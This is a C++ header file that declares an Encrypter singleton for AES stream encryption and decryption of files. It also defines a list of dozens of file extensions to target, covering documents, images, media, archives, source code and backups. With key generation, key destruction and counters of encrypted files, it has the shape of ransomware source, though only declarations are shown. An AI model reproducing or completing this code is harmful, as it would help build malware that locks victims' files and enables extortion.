#ifndef ENCRYPTER_H
#define ENCRYPTER_H

#include <stdint.h>

//enum Option { Encrypt, Decrypt };

// Encrypt file with the next extensions:
const char extensions[][7] = {
  "3ds", "3gp", "7z", "asm", "avi", "backup", "bak", "bat", "bin", "bmp",
  "cfg", "cmd", "c", "cpp", "css", "diff", "doc", "docx", "flv", "gci", "ggb",
  "gif", "gz", "h", "htm", "html", "i3d", "ico", "inf", "ini", "ino", "iso",
  "jar", "jpeg", "jpg", "js", "json", "m2", "md", "mkv", "mod", "mov", "mp3",
  "mp4", "mpeg", "mpg", "log", "odt", "pas", "pdf", "php", "png", "ppt",
  "pptx", "py", "rar", "raw", "rtf", "rpx", "sav", "sql", "svg", "swf", "tar",
  "txt", "vbs", "wav", "wma", "wmv", "xls", "xml", "xps", "zip"
};

class IController {
public:
  virtual void generateKey(char*&, unsigned int&) = 0;
  virtual void encrypt(const char*) = 0;
  virtual void decrypt(const char*, uint8_t*) = 0;
  virtual void destroyKey() = 0;
  virtual unsigned int getCantEncrypted() = 0;
  virtual unsigned int getCantDecrypted() = 0;
};

class Encrypter : public IController {
private:
  uint8_t* key;
  unsigned int cant_encrypted;
  unsigned int cant_decrypted;

  void encryptFile(char*);
  void decryptFile(char*);
  void AES_stream_encrypt(char*);
  void AES_stream_decrypt(char*);

  static Encrypter* instance;
  Encrypter();
public:
  static Encrypter* getInstance();
  virtual void generateKey(char*&, unsigned int&);
  virtual void encrypt(const char*);
  virtual void decrypt(const char*, uint8_t*);
  virtual void destroyKey();
  virtual unsigned int getCantEncrypted();
  virtual unsigned int getCantDecrypted();
};

#endif
